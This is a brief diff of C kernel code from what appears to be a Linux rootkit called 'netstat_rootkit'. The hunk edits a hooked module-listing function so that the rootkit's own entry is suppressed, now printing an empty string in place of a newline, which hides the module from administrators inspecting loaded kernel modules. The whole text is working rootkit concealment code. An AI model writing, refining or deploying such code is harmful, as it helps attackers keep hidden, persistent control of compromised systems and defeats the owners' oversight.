@@ -53,7 +53,7 @@ static asmlinkage int new_m_show(struct seq_file *m, void *p)
 	if (strcmp(mod->name, "netstat_rootkit") == 0)
 	{
 		printk(KERN_INFO "not so fast amigo\n");
-		seq_puts(m,"\n");
+		seq_puts(m,"");
 		return 0;	
 	}
 	return old_m_show(m, p);
